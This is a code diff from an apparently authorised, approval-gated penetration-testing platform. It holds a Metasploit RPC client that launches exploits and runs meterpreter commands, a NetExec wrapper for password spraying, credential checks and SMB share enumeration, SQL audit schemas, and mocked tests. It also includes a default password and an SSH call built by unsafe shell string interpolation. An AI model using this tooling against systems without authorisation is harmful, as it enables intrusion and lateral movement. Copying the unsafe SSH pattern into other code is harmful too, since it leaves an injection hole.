-            username: Usuario MSF (default: msf)
-            password: Password MSF (default: scanops2024)
-        """
+    def __init__(self, host=None, port=None, username=None, password=None, timeout=None):
         self.host = host or MSF_CONFIG.get('host', 'localhost')
         self.port = port or MSF_CONFIG.get('port', 55553)
         self.username = username or MSF_CONFIG.get('username', 'msf')
         self.password = password or MSF_CONFIG.get('password', 'scanops2024')
+        self.timeout = timeout or MSF_CONFIG.get('timeout', 30)
 
         self.token = None
-        self.base_url = f"http://{self.host}:{self.port}"
-        self.rpc_url = f"{self.base_url}/api/v1"
+        self.rpc_url = f"http://{self.host}:{self.port}/api/1.0/"
 
         self.session = requests.Session()
-        self.session.timeout = 30
 
-        logger.info(f"MSFClient iniciado: {self.host}:{self.port}")
+        logger.info(f"MSFClient (MsgPack) iniciado: {self.host}:{self.port}")
+
+    def _decode_bytes(self, data: Any) -> Any:
+        """Helper para decodificar bytes de msgpack recursivamente"""
+        if isinstance(data, bytes):
+            return data.decode('utf-8', errors='replace')
+        if isinstance(data, dict):
+            return {self._decode_bytes(k): self._decode_bytes(v) for k, v in data.items()}
+        if isinstance(data, list):
+            return [self._decode_bytes(i) for i in data]
+        return data
+
+    def _rpc_call(self, method: str, *args) -> Any:
+        """
+        Realiza una llamada RPC utilizando MessagePack.
+        Patrón: [method, token, *args]
+        """
+        if method == 'auth.login':
+            payload_list = [method] + list(args)
+        else:
+            if not self.token:
+                logger.error(f"No hay token para llamar a {method}")
+                return None
+            payload_list = [method, self.token] + list(args)
+
+        payload = msgpack.packb(payload_list)
+
+        try:
+            r = self.session.post(
+                self.rpc_url,
+                data=payload,
+                headers={'Content-Type': 'binary/message-pack'},
+                timeout=self.timeout
+            )
+
+            if r.status_code != 200:
+                logger.error(f"Error HTTP {r.status_code} en RPC {method}")
+                return None
+
+            # Deserializar y decodificar bytes a strings
+            data = msgpack.unpackb(r.content, raw=False)
+            return self._decode_bytes(data)
+
+        except Exception as e:
+            logger.error(f"Excepción en RPC {method}: {e}")
+            return None
 
     def _check_connection(self) -> bool:
-        """Verifica que MSF está disponible"""
+        """Verifica conectividad básica (GET /)"""
         try:
-            response = requests.get(
-                f"{self.base_url}/",
-                timeout=5
-            )
-            logger.info(f"✅ MSF accesible en {self.host}:{self.port}")
-            return response.status_code < 500
-        except Exception as e:
-            logger.error(f"❌ No se puede conectar a MSF: {e}")
+            r = requests.get(f"http://{self.host}:{self.port}/", timeout=3)
+            return r.status_code < 500
+        except:
             return False
 
     def login(self) -> bool:
-        """
-        Autentica contra Metasploit RPC.
-
-        Returns:
-            True si login exitoso, False si falla
-        """
-        if not self._check_connection():
-            logger.error("MSF no está disponible")
-            return False
-
+        """Autentica contra Metasploit RPC"""
         try:
-            payload = {
-                'username': self.username,
-                'password': self.password
-            }
-
-            response = self.session.post(
-                f"{self.rpc_url}/auth/login",
-                json=payload,
-                timeout=10
-            )
-
-            if response.status_code == 200:
-                data = response.json()
-                self.token = data.get('token')
-                logger.info(f"✅ Login exitoso. Token: {self.token[:20]}...")
+            res = self._rpc_call('auth.login', self.username, self.password)
+            if res and res.get('result') == 'success':
+                self.token = res.get('token')
+                logger.info("✅ Login MSF exitoso vía MsgPack")
                 return True
             else:
-                logger.error(f"❌ Login fallido: {response.status_code} {response.text}")
+                logger.error(f"❌ Login MSF fallido: {res}")
                 return False
-
         except Exception as e:
-            logger.error(f"❌ Error en login: {e}")
+            logger.error(f"❌ Error en login MSF: {e}")
             return False
 
     def is_authenticated(self) -> bool:
-        """Verifica si hay token válido"""
         return self.token is not None
 
     def execute_exploit(
@@ -11831,282 +12257,258 @@ class MSFClient:
         options: Dict = None
     ) -> Optional[Dict]:
         """
-        Ejecuta un exploit contra un target.
-
-        Args:
-            module_path: Ruta del módulo MSF (ej: exploit/windows/smb/ms17_010)
-            target_host: IP del target
-            target_port: Puerto del servicio vulnerable
-            payload: Payload a usar (ej: generic/shell_reverse_tcp)
-            lhost: IP local para callback (default: 10.202.15.199)
-            lport: Puerto local para callback (default: 4444)
-            options: Opciones adicionales del exploit
-
-        Returns:
-            Dict con session_id, success, output, error
+        Ejecuta un exploit. Mantiene firma original para compatibilidad.
         """
         if not self.is_authenticated():
-            logger.error("No autenticado. Ejecuta login() primero")
+            logger.error("No autenticado")
             return None
 
-        try:
-            exploit_options = {
-                'RHOSTS': target_host,
-                'RPORT': target_port,
-                'PAYLOAD': payload,
-                'LHOST': lhost,
-                'LPORT': lport,
-            }
+        exploit_options = {
+            'RHOSTS': target_host,
+            'RPORT': target_port,
+            'PAYLOAD': payload,
+            'LHOST': lhost,
+            'LPORT': lport,
+        }
+        if options:
+            exploit_options.update(options)
 
-            if options:
-                exploit_options.update(options)
+        # RPC: module.execute(type, name, options)
+        res = self._rpc_call('module.execute', 'exploit', module_path, exploit_options)
 
-            logger.info(f"🚀 Ejecutando exploit: {module_path} contra {target_host}:{target_port}")
-
-            # Crear sesión de exploit
-            response = self.session.post(
-                f"{self.rpc_url}/modules/exploit/execute",
-                headers={'Authorization': f'Bearer {self.token}'},
-                json={
-                    'module': module_path,
-                    'options': exploit_options
-                },
-                timeout=60
-            )
-
-            if response.status_code in [200, 201]:
-                result = response.json()
-                session_id = result.get('session_id')
-
-                logger.info(f"✅ Exploit ejecutado. Session ID: {session_id}")
-
-                return {
-                    'success': True,
-                    'session_id': session_id,
-                    'module': module_path,
-                    'target': f"{target_host}:{target_port}",
-                    'timestamp': datetime.now().isoformat(),
-                    'output': result.get('output', ''),
-                    'error': None
-                }
-            else:
-                error_msg = response.text
-                logger.error(f"❌ Exploit fallido: {response.status_code} {error_msg}")
-
-                return {
-                    'success': False,
-                    'session_id': None,
-                    'module': module_path,
-                    'target': f"{target_host}:{target_port}",
-                    'timestamp': datetime.now().isoformat(),
-                    'output': '',
-                    'error': error_msg
-                }
-
-        except Exception as e:
-            logger.error(f"❌ Error ejecutando exploit: {e}")
+        if res and ('job_id' in res or 'uuid' in res):
+            logger.info(f"✅ Exploit lanzado: {module_path}")
             return {
-                'success': False,
-                'session_id': None,
+                'success': True,
+                'job_id': res.get('job_id'),
+                'session_id': res.get('uuid'),
                 'module': module_path,
                 'target': f"{target_host}:{target_port}",
                 'timestamp': datetime.now().isoformat(),
-                'output': '',
-                'error': str(e)
+                'output': str(res)
             }
 
-    def get_session_info(self, session_id: int) -> Optional[Dict]:
-        """
-        Obtiene información de una sesión activa.
+        logger.error(f"❌ Error lanzando exploit: {res}")
+        return {
+            'success': False,
+            'error': str(res),
+            'module': module_path,
+            'target': f"{target_host}:{target_port}",
+            'timestamp': datetime.now().isoformat()
+        }
 
-        Args:
-            session_id: ID de la sesión
+    def list_sessions(self) -> Dict:
+        """Lista sesiones activas"""
+        res = self._rpc_call('session.list')
+        return res or {}
 
-        Returns:
-            Dict con info de la sesión
-        """
-        if not self.is_authenticated():
-            logger.error("No autenticado")
-            return None
-
-        try:
-            response = self.session.get(
-                f"{self.rpc_url}/sessions/{session_id}",
-                headers={'Authorization': f'Bearer {self.token}'},
-                timeout=10
-            )
-
-            if response.status_code == 200:
-                session_info = response.json()
-                logger.info(f"📊 Session info obtenida: {session_id}")
-                return session_info
-            else:
-                logger.warning(f"⚠️ No se encontró sesión {session_id}")
-                return None
-
-        except Exception as e:
-            logger.error(f"❌ Error obteniendo sesión: {e}")
-            return None
-
-    def kill_session(self, session_id: int) -> bool:
-        """
-        Termina una sesión de exploit.
-
-        Args:
-            session_id: ID de la sesión a terminar
-
-        Returns:
-            True si la sesión fue terminada
-        """
-        if not self.is_authenticated():
-            logger.error("No autenticado")
-            return False
-
-        try:
-            response = self.session.delete(
-                f"{self.rpc_url}/sessions/{session_id}",
-                headers={'Authorization': f'Bearer {self.token}'},
-                timeout=10
-            )
-
-            if response.status_code == 200:
-                logger.info(f"✅ Sesión {session_id} terminada")
-                return True
-            else:
-                logger.warning(f"⚠️ No se pudo terminar sesión {session_id}")
-                return False
-
-        except Exception as e:
-            logger.error(f"❌ Error terminando sesión: {e}")
-            return False
-
-    def list_sessions(self) -> List[Dict]:
-        """
-        Lista todas las sesiones activas.
-
-        Returns:
-            Lista de sesiones activas
-        """
-        if not self.is_authenticated():
-            logger.error("No autenticado")
-            return []
-
-        try:
-            response = self.session.get(
-                f"{self.rpc_url}/sessions",
-                headers={'Authorization': f'Bearer {self.token}'},
-                timeout=10
-            )
-
-            if response.status_code == 200:
-                sessions = response.json().get('sessions', [])
-                logger.info(f"📊 {len(sessions)} sesiones activas")
-                return sessions
-            else:
-                logger.warning(f"⚠️ No se pudieron listar sesiones")
-                return []
-
-        except Exception as e:
-            logger.error(f"❌ Error listando sesiones: {e}")
-            return []
-
-    def run_command(self, session_id: int, command: str) -> Optional[str]:
-        """
-        Ejecuta un comando en una sesión activa.
-
-        Args:
-            session_id: ID de la sesión
-            command: Comando a ejecutar
-
-        Returns:
-            Output del comando
-        """
-        if not self.is_authenticated():
-            logger.error("No autenticado")
-            return None
-
-        try:
-            response = self.session.post(
-                f"{self.rpc_url}/sessions/{session_id}/command",
-                headers={'Authorization': f'Bearer {self.token}'},
-                json={'command': command},
-                timeout=30
-            )
-
-            if response.status_code == 200:
-                result = response.json()
-                output = result.get('output', '')
-                logger.info(f"✅ Comando ejecutado en sesión {session_id}")
-                return output
-            else:
-                logger.error(f"❌ Error ejecutando comando: {response.status_code}")
-                return None
-
-        except Exception as e:
-            logger.error(f"❌ Error ejecutando comando: {e}")
-            return None
-
-    def get_active_sessions(self) -> List[int]:
-        """
-        Obtiene lista de IDs de sesiones activas.
-
-        Returns:
-            Lista de session IDs
-        """
+    def get_session_info(self, session_id: Any) -> Optional[Dict]:
+        """Obtiene info de sesión"""
         sessions = self.list_sessions()
-        return [s.get('id') for s in sessions if s.get('id')]
+        return sessions.get(str(session_id))
+
+    def kill_session(self, session_id: Any) -> bool:
+        """Termina una sesión"""
+        res = self._rpc_call('session.stop', str(session_id))
+        return res and res.get('result') == 'success'
 
     def kill_all_sessions(self) -> int:
-        """
-        Termina TODAS las sesiones activas.
+        """Termina todas las sesiones activas"""
+        sessions = self.list_sessions()
+        count = 0
+        for sid in sessions.keys():
+            if self.kill_session(sid):
+                count += 1
+        logger.info(f"🛑 {count} sesiones terminadas")
+        return count
 
-        Returns:
-            Número de sesiones terminadas
-        """
-        session_ids = self.get_active_sessions()
-        killed = 0
-
-        for session_id in session_ids:
-            if self.kill_session(session_id):
-                killed += 1
-
-        logger.info(f"🛑 {killed} sesiones terminadas")
-        return killed
+    def run_command(self, session_id: Any, command: str) -> Optional[str]:
+        """Ejecuta comando en sesión meterpreter"""
+        res = self._rpc_call('session.meterpreter_run_single', str(session_id), command)
+        return res.get('result') if res else None
 
     def logout(self) -> bool:
-        """
-        Desconecta de MSF RPC.
-
-        Returns:
-            True si logout exitoso
-        """
-        if not self.is_authenticated():
+        if not self.token:
             return True
+        res = self._rpc_call('auth.logout', self.token)
+        self.token = None
+        return res and res.get('result') == 'success'
 
-        try:
-            response = self.session.post(
-                f"{self.rpc_url}/auth/logout",
-                headers={'Authorization': f'Bearer {self.token}'},
-                timeout=10
-            )
-
-            self.token = None
-            logger.info("✅ Logout exitoso")
-            return response.status_code == 200
-
-        except Exception as e:
-            logger.error(f"❌ Error en logout: {e}")
-            return False
-
-# Singleton instance
+# Singleton factory
 _msf_client = None
 
 def get_msf_client() -> MSFClient:
-    """Obtiene instancia singleton del cliente MSF"""
     global _msf_client
     if _msf_client is None:
         _msf_client = MSFClient()
     return _msf_client
+FILE:services\exploit_engine\netexec_client.py
+"""
+NetExec Client (Successor of CrackMapExec)
+Realiza movimiento lateral y password spray en SMB, SSH y RDP.
+"""
+
+import subprocess
+import logging
+import os
+import sys
+import re
+from typing import Dict, List, Optional
+from datetime import datetime
+
+# Importar Kill Switch
+try:
+    from kill_switch_service import kill_switch_svc
+except ImportError:
+    # Fallback para tests
+    class MockKillSwitch:
+        def is_active(self): return False
+    kill_switch_svc = MockKillSwitch()
+
+try:
+    from config import DB_CONFIG, NXC_TIMEOUT, NXC_THREADS, NXC_DEFAULT_DOMAIN
+except ImportError:
+    DB_CONFIG = {}
+    NXC_TIMEOUT = 30
+    NXC_THREADS = 10
+    NXC_DEFAULT_DOMAIN = "WORKGROUP"
+
+logger = logging.getLogger("NetExecClient")
+
+class NetExecClient:
+    """
+    Cliente para interactuar con la CLI de NetExec (nxc).
+    """
+
+    def __init__(self):
+        self.timeout = NXC_TIMEOUT
+        self.threads = NXC_THREADS
+        self.domain = NXC_DEFAULT_DOMAIN
+        logger.info("NetExecClient inicializado")
+
+    def _execute_nxc(self, protocol: str, target: str, args: List[str]) -> Dict:
+        """Ejecuta el comando nxc y parsea el resultado"""
+
+        if kill_switch_svc.is_active():
+            logger.warning(f"🛑 Kill Switch activo. Abortando ejecución de NetExec en {target}")
+            return {"success": False, "error": "Kill switch active"}
+
+        cmd = ["nxc", protocol, target] + args
+
+        # Enmascarar credenciales en logs
+        masked_cmd = []
+        for i, arg in enumerate(cmd):
+            if i > 0 and (cmd[i-1] == "-p" or cmd[i-1] == "--password"):
+                masked_cmd.append("*******")
+            else:
+                masked_cmd.append(arg)
+
+        logger.info(f"Ejecutando: {' '.join(masked_cmd)}")
+
+        start_time = datetime.now()
+        try:
+            result = subprocess.run(
+                cmd,
+                capture_output=True,
+                text=True,
+                timeout=self.timeout
+            )
+
+            output = result.stdout + result.stderr
+            duration = (datetime.now() - start_time).total_seconds()
+
+            # Parsear SUCCESS/FAILURE
+            # NetExec suele usar [+] para éxito y [-] para fallo
+            # También buscamos (Pwn3d!) para SMB
+            success = "[+]" in output and "(Pwn3d!)" in output if protocol == "smb" else "[+]" in output
+
+            return {
+                "success": success,
+                "output": output,
+                "duration_seconds": duration,
+                "error": None if result.returncode == 0 or "[+]" in output or "[-]" in output else f"Return code {result.returncode}"
+            }
+
+        except FileNotFoundError:
+            logger.error("❌ NetExec (nxc) no encontrado en el sistema")
+            return {"success": False, "error": "nxc not found"}
+        except subprocess.TimeoutExpired:
+            logger.error(f"⏱️ Timeout ejecutando NetExec en {target}")
+            return {"success": False, "error": "Timeout expired"}
+        except Exception as e:
+            logger.error(f"❌ Error inesperado ejecutando NetExec: {e}")
+            return {"success": False, "error": str(e)}
+
+    def check_smb(self, target_ip: str, username: str, password: str) -> Dict:
+        """Verifica credenciales SMB"""
+        args = ["-u", username, "-p", password]
+        if self.domain:
+            args += ["-d", self.domain]
+
+        res = self._execute_nxc("smb", target_ip, args)
+        res["lateral_movement_possible"] = res.get("success", False)
+        return res
+
+    def check_ssh(self, target_ip: str, username: str, password: str) -> Dict:
+        """Verifica credenciales SSH"""
+        args = ["-u", username, "-p", password]
+        res = self._execute_nxc("ssh", target_ip, args)
+        res["lateral_movement_possible"] = res.get("success", False)
+        return res
+
+    def check_rdp(self, target_ip: str, username: str, password: str) -> Dict:
+        """Verifica credenciales RDP"""
+        args = ["-u", username, "-p", password]
+        res = self._execute_nxc("rdp", target_ip, args)
+        res["lateral_movement_possible"] = res.get("success", False)
+        return res
+
+    def password_spray(self, target_ip: str, users_list: List[str], password: str) -> Dict:
+        """Realiza password spray (mismo password, múltiples usuarios)"""
+        # NetExec permite pasar una lista de usuarios o un archivo, pero aquí lo haremos secuencial o vía CLI si nxc lo soporta
+        # nxc smb target -u users.txt -p password
+        # Para simplificar y seguir el contrato, si users_list es lista, la unimos o ejecutamos nxc
+        users_arg = ",".join(users_list) if isinstance(users_list, list) else users_list
+        args = ["-u", users_arg, "-p", password]
+        return self._execute_nxc("smb", target_ip, args)
+
+    def enumerate_shares(self, target_ip: str, username: str, password: str) -> Dict:
+        """Enumera carpetas compartidas en SMB"""
+        args = ["-u", username, "-p", password, "--shares"]
+        res = self._execute_nxc("smb", target_ip, args)
+
+        shares = []
+        if res["success"]:
+            # Intentar parsear shares del output
+            # Ejemplo: SMB         192.168.1.10    445    TARGET          [+] TARGET\Administrator:password (Pwn3d!)
+            #          SMB         192.168.1.10    445    TARGET          [*] Enumerated shares
+            #          SMB         192.168.1.10    445    TARGET          Share           Permissions     Remark
+            #          SMB         192.168.1.10    445    TARGET          -----           -----------     ------
+            #          SMB         192.168.1.10    445    TARGET          ADMIN$          READ,WRITE      Remote Admin
+
+            lines = res["output"].splitlines()
+            for line in lines:
+                if "READ" in line or "WRITE" in line:
+                    parts = re.split(r'\s+', line.strip())
+                    # Intentar encontrar el nombre del share
+                    for i, part in enumerate(parts):
+                        if part in ["READ", "READ,WRITE", "WRITE"]:
+                            if i > 0:
+                                shares.append(parts[i-1])
+                            break
+
+        res["shares_found"] = list(set(shares))
+        return res
+
+# Factory function
+_netexec_client = None
+
+def get_netexec_client() -> NetExecClient:
+    """Retorna instancia singleton de NetExecClient"""
+    global _netexec_client
+    if _netexec_client is None:
+        _netexec_client = NetExecClient()
+    return _netexec_client
 FILE:services\exploit_engine\patch_verifier.py
 """
 Patch Verifier Service - US-5.10
@@ -12528,6 +12930,7 @@ import time
 import threading
 import subprocess
 import psycopg2
+import json
 from datetime import datetime
 from typing import Dict, List, Optional
 
@@ -12576,6 +12979,7 @@ class ProductionMonitor:
         self.db_config = db_config or DB_CONFIG
         self.target_ip = self.config['target_ip']
         self.ssh_user = self.config['ssh_user']
+        self.ssh_password = self.config.get('ssh_password', '')
         self.check_interval = self.config['check_interval']
 
         self._running = False
@@ -12586,16 +12990,24 @@ class ProductionMonitor:
 
     def _ssh_command(self, command: str) -> Optional[str]:
         """
-        Ejecuta comando en target via SSH.
-
-        Args:
-            command: Comando a ejecutar
-
-        Returns:
-            Output del comando o None si falla
+        Ejecuta comando en target via SSH usando sshpass si hay password.
         """
         try:
-            ssh_cmd = f"ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {self.ssh_user}@{self.target_ip} '{command}'"
+            if self.ssh_password:
+                ssh_cmd = (
+                    f"sshpass -p '{self.ssh_password}' ssh "
+                    f"-o ConnectTimeout=5 "
+                    f"-o StrictHostKeyChecking=no "
+                    f"-o NumberOfPasswordPrompts=1 "
+                    f"{self.ssh_user}@{self.target_ip} '{command}'"
+                )
+            else:
+                ssh_cmd = (
+                    f"ssh -o ConnectTimeout=5 "
+                    f"-o StrictHostKeyChecking=no "
+                    f"{self.ssh_user}@{self.target_ip} '{command}'"
+                )
+
             result = subprocess.run(
                 ssh_cmd,
                 shell=True,
@@ -12842,8 +13254,8 @@ class ProductionMonitor:
                 INSERT INTO production_impact_logs (
                     approval_id, target_ip, reason,
                     cpu_value, memory_value, connections_value,
-                    services_down, activated_by, created_at
-                ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, NOW())
+                    services_down, checks, activated_by, created_at
+                ) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, NOW())
             """
 
             with conn.cursor() as cur:
@@ -12854,7 +13266,8 @@ class ProductionMonitor:
                     checks['cpu']['value'],
                     checks['memory']['value'],
                     checks['connections']['value'],
-                    str(checks['services']['services_down']),
+                    json.dumps(checks['services']['services_down']),
+                    json.dumps(checks),
                     'PRODUCTION_MONITOR_AUTO'
                 ))
                 conn.commit()
@@ -13032,7 +13445,7 @@ from approval_service import ApprovalService
 from config import JWT_SECRET_KEY, JWT_ALGORITHM, DB_CONFIG
 import psycopg2
 
-from exploit_engine.exploit_executor import get_executor
+from exploit_executor import get_executor
 
 executor = get_executor()
 aborted = executor.abort_all_exploits()
@@ -13578,6 +13991,68 @@ CREATE TABLE IF NOT EXISTS m4_kill_switch_logs (
     ip_origin VARCHAR(45),
     timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 );
+FILE:services\exploit_engine\db\netexec_results_schema.sql
+-- ════════════════════════════════════════════════════════════════════════════════
+-- TABLA: netexec_results
+-- Auditoría de movimiento lateral y validación de credenciales con NetExec (US-5.2)
+-- ════════════════════════════════════════════════════════════════════════════════
+
+CREATE TABLE IF NOT EXISTS netexec_results (
+    id SERIAL PRIMARY KEY,
+
+    -- Referencia a aprobación
+    approval_id INTEGER REFERENCES m4_approvals(id) ON DELETE CASCADE,
+
+    -- Target info
+    target_ip VARCHAR(45) NOT NULL,
+    protocol VARCHAR(10) NOT NULL,  -- smb, ssh, rdp
+
+    -- Credenciales usadas
+    username VARCHAR(100),
+
+    -- Resultado
+    success BOOLEAN DEFAULT FALSE,
+    output TEXT,
+
+    -- Datos adicionales
+    shares_found TEXT,  -- JSON array de shares descubiertos
+    lateral_movement_possible BOOLEAN DEFAULT FALSE,
+
+    -- Auditoría
+    executed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+    duration_seconds FLOAT
+);
+
+-- ════════════════════════════════════════════════════════════════════════════════
+-- ÍNDICES
+-- ════════════════════════════════════════════════════════════════════════════════
+
+CREATE INDEX IF NOT EXISTS idx_netexec_results_approval_id ON netexec_results(approval_id);
+CREATE INDEX IF NOT EXISTS idx_netexec_results_target_ip ON netexec_results(target_ip);
+CREATE INDEX IF NOT EXISTS idx_netexec_results_protocol ON netexec_results(protocol);
+CREATE INDEX IF NOT EXISTS idx_netexec_results_success ON netexec_results(success);
+
+-- ════════════════════════════════════════════════════════════════════════════════
+-- COMMENTS
+-- ════════════════════════════════════════════════════════════════════════════════
+
+COMMENT ON TABLE netexec_results IS
+'Registro de intentos de movimiento lateral y validación de credenciales usando NetExec (nxc).';
+
+COMMENT ON COLUMN netexec_results.approval_id IS
+'ID de la aprobación M4 que disparó esta acción.';
+
+COMMENT ON COLUMN netexec_results.protocol IS
+'Protocolo verificado: smb, ssh o rdp.';
+
+COMMENT ON COLUMN netexec_results.success IS
+'True si las credenciales fueron válidas (Pwn3d! en SMB).';
+
+COMMENT ON COLUMN netexec_results.lateral_movement_possible IS
+'Indica si se obtuvo acceso administrativo o capacidad de ejecución.';
+
+COMMENT ON COLUMN netexec_results.shares_found IS
+'Lista en formato JSON de las carpetas compartidas detectadas.';
 FILE:services\exploit_engine\db\patch_verifier_schema.sql
 -- ════════════════════════════════════════════════════════════════════════════════
 -- US-5.10 - Re-exploit post-parche
@@ -13641,27 +14116,22 @@ FROM exploit_results er
 WHERE er.success = TRUE
 ORDER BY er.created_at DESC;
 FILE:services\exploit_engine\db\production_impact_logs_schema.sql
--- ════════════════════════════════════════════════════════════════════════════════
--- TABLA: production_impact_logs
--- Auditoría de impactos detectados en producción (US-5.9)
--- ════════════════════════════════════════════════════════════════════════════════
+-- Schema for production_impact_logs table
+-- Created to fix BUG 3: missing column 'activated_by' and other schema issues
 
 CREATE TABLE IF NOT EXISTS production_impact_logs (
     id SERIAL PRIMARY KEY,
-    approval_id INTEGER REFERENCES m4_approvals(id),
-    target_ip VARCHAR(45) NOT NULL,
-    reason TEXT NOT NULL,
+    approval_id INTEGER,
+    target_ip VARCHAR(45),
+    reason TEXT,
     cpu_value FLOAT,
     memory_value FLOAT,
     connections_value INTEGER,
-    services_down TEXT,
+    services_down JSONB,
+    checks JSONB,
     activated_by VARCHAR(100),
     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 );
-
-CREATE INDEX IF NOT EXISTS idx_impact_logs_approval ON production_impact_logs(approval_id);
-CREATE INDEX IF NOT EXISTS idx_impact_logs_target ON production_impact_logs(target_ip);
-CREATE INDEX IF NOT EXISTS idx_impact_logs_timestamp ON production_impact_logs(created_at DESC);
 FILE:services\exploit_engine\tests\test_approval_service.py
 import pytest
 from unittest.mock import MagicMock, patch
@@ -14307,6 +14777,174 @@ def test_next_saturday_calculation():
     assert next_sat.weekday() == 5
     assert next_sat.hour == 1
     assert next_sat > datetime.now()
+
+@patch('m4_orchestrator.get_netexec_client')
+@patch('m4_orchestrator.M4Orchestrator._get_pending_approvals')
+@patch('m4_orchestrator.M4Orchestrator._get_vulnerable_ports')
+@patch('m4_orchestrator.M4Orchestrator._get_connection')
+@patch('m4_orchestrator.get_msf_client')
+@patch('m4_orchestrator.get_monitor')
+@patch('m4_orchestrator.get_hydra_executor')
+def test_orchestrator_includes_netexec_phase(mock_hydra, mock_monitor, mock_msf, mock_conn, mock_ports, mock_approvals, mock_get_nxc):
+    """Verifica que el orquestador incluya la fase de NetExec."""
+    # Mock NetExec
+    mock_nxc = MagicMock()
+    mock_get_nxc.return_value = mock_nxc
+    mock_nxc.check_smb.return_value = {'success': True, 'lateral_movement_possible': True}
+
+    # Mock Orquestador dependencies
+    mock_approvals.return_value = [{'id': 1, 'cve_id': 'CVE-2017-0144', 'target_ip': '192.168.1.10'}]
+    mock_ports.return_value = [{'port': 445, 'service': 'smb', 'username': 'Administrator'}]
+
+    # Mock MSF
+    mock_msf_instance = mock_msf.return_value
+    mock_msf_instance.login.return_value = True
+
+    orchestrator = M4Orchestrator()
+    # Mock _get_discovered_credentials to return nothing so it uses defaults
+    orchestrator._get_discovered_credentials = MagicMock(return_value=[])
+    # Mock _persist_netexec_result to avoid DB calls
+    orchestrator._persist_netexec_result = MagicMock()
+    # Mock _get_vulnerability_info
+    orchestrator._get_vulnerability_info = MagicMock(return_value={'port': 445, 'msf_module': 'exploit/windows/smb/ms17_010'})
+    # Mock executor
+    orchestrator.executor.execute = MagicMock(return_value={'success': True})
+
+    result = orchestrator.run()
+
+    # Verificaciones
+    assert 'netexec_laterals' in result
+    assert result['netexec_laterals'] > 0
+    assert mock_nxc.check_smb.called or mock_nxc.check_ssh.called
+FILE:services\exploit_engine\tests\test_netexec_client.py
+import pytest
+from unittest.mock import MagicMock, patch
+import subprocess
+import os
+import sys
+
+# Asegurar importaciones
+sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from netexec_client import NetExecClient, get_netexec_client
+
+@pytest.fixture
+def client():
+    return NetExecClient()
+
+def test_check_smb_success(client):
+    """Prueba éxito en SMB con (Pwn3d!)"""
+    mock_output = "SMB  192.168.1.10  445  TARGET  [+] TARGET\\Administrator:password (Pwn3d!)"
+
+    with patch('subprocess.run') as mock_run:
+        mock_run.return_value = MagicMock(
+            stdout=mock_output,
+            stderr="",
+            returncode=0
+        )
+
+        result = client.check_smb("192.168.1.10", "Administrator", "password")
+
+        assert result["success"] is True
+        assert result["lateral_movement_possible"] is True
+        assert "(Pwn3d!)" in result["output"]
+
+def test_check_smb_failure(client):
+    """Prueba fallo en SMB con STATUS_LOGON_FAILURE"""
+    mock_output = "SMB  192.168.1.10  445  TARGET  [-] TARGET\\Administrator:password STATUS_LOGON_FAILURE"
+
+    with patch('subprocess.run') as mock_run:
+        mock_run.return_value = MagicMock(
+            stdout=mock_output,
+            stderr="",
+            returncode=0
+        )
+
+        result = client.check_smb("192.168.1.10", "Administrator", "wrong_pass")
+
+        assert result["success"] is False
+        assert result["lateral_movement_possible"] is False
+
+def test_check_ssh_success(client):
+    """Prueba éxito en SSH"""
+    mock_output = "SSH  192.168.1.10  22  TARGET  [+] root:password"
+
+    with patch('subprocess.run') as mock_run:
+        mock_run.return_value = MagicMock(
+            stdout=mock_output,
+            stderr="",
+            returncode=0
+        )
+
+        result = client.check_ssh("192.168.1.10", "root", "password")
+
+        assert result["success"] is True
+        assert result["lateral_movement_possible"] is True
+
+def test_password_spray_multiple_targets(client):
+    """Prueba password spray simulado"""
+    mock_output = "[+] admin:password (Pwn3d!)\n[-] user1:password\n[-] user2:password"
+
+    with patch('subprocess.run') as mock_run:
+        mock_run.return_value = MagicMock(
+            stdout=mock_output,
+            stderr="",
+            returncode=0
+        )
+
+        result = client.password_spray("192.168.1.10", ["admin", "user1", "user2"], "password")
+
+        assert result["success"] is True
+
+def test_kill_switch_blocks_execution(client):
+    """Verifica que el Kill Switch bloquea la ejecución"""
+    with patch('kill_switch_service.kill_switch_svc.is_active', return_value=True):
+        with patch('subprocess.run') as mock_run:
+            result = client.check_smb("192.168.1.10", "admin", "pass")
+
+            assert result["success"] is False
+            assert result["error"] == "Kill switch active"
+            mock_run.assert_not_called()
+
+def test_nxc_not_installed(client):
+    """Verifica manejo de nxc no instalado"""
+    with patch('subprocess.run', side_effect=FileNotFoundError):
+        result = client.check_smb("192.168.1.10", "admin", "pass")
+
+        assert result["success"] is False
+        assert result["error"] == "nxc not found"
+
+def test_enumerate_shares(client):
+    """Prueba enumeración de shares"""
+    mock_output = """
+SMB  192.168.1.10  445  TARGET  [+] TARGET\\Administrator:password (Pwn3d!)
+SMB  192.168.1.10  445  TARGET  Share           Permissions     Remark
+SMB  192.168.1.10  445  TARGET  -----           -----------     ------
+SMB  192.168.1.10  445  TARGET  ADMIN$          READ,WRITE      Remote Admin
+SMB  192.168.1.10  445  TARGET  C$              READ,WRITE      Default share
+SMB  192.168.1.10  445  TARGET  IPC$            READ            Remote IPC
+"""
+
+    with patch('subprocess.run') as mock_run:
+        mock_run.return_value = MagicMock(
+            stdout=mock_output,
+            stderr="",
+            returncode=0
+        )
+
+        result = client.enumerate_shares("192.168.1.10", "Administrator", "password")
+
+        assert result["success"] is True
+        assert "ADMIN$" in result["shares_found"]
+        assert "C$" in result["shares_found"]
+        assert "IPC$" in result["shares_found"]
+        assert len(result["shares_found"]) == 3
+
+def test_factory():
+    """Verifica la función factory"""
+    c1 = get_netexec_client()
+    c2 = get_netexec_client()
+    assert c1 is c2
+    assert isinstance(c1, NetExecClient)
 FILE:services\recon_engine\__init__.py
 """Recon Engine - M2 Microservice"""
 __version__ = "1.0.0"
